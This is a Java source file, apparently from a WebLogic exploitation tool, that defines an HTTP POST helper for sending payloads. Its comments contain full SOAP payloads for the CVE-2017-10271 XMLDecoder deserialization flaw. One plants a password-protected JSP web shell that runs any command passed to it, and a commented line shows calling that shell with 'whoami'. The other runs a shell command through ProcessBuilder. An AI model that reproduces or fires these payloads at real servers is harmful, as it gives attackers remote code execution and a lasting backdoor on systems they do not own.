package unserWeblogic.HTTP;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;

public class HTTP {
    public static String sendPost(String url, String payload) {
        //String cmdFilePath = "servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + cmdFileName;
        // String payload = readFileContent("src/main/java/unserWeblogic/gadgets/CVE_2017_10271.xml");
        //"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"><object class=\"java.io.PrintWriter\"> <string>" + cmdFilePath + "</string><void method=\"println\"><string><![CDATA[<% if(\"secfree\".equals(request.getParameter(\"password\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"command\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>]]></string></void><void method=\"close\"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
        //"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.6.0\" class=\"java.beans.XMLDecoder\"><object class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"1\"><void index=\"0\"><string>touch /tmp/mercy.test</string></void></array><void method=\"start\"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";
        try {
            URL realUrl = new URL(url);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            conn.setRequestProperty("Content-Type", "text/xml");
            conn.setRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            out.print(payload);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            // System.out.println("[+] " + url + "/bea_wls_internal/" + cmdFileName + "?password=secfree&command=whoami");
        }
        finally{
            try{
                if(out!=null){
                    out.close();
                }
                if(in!=null){
                    in.close();
                }
            }
            catch(IOException ex){
                ex.printStackTrace();
            }
        }
        return result;
    }
}
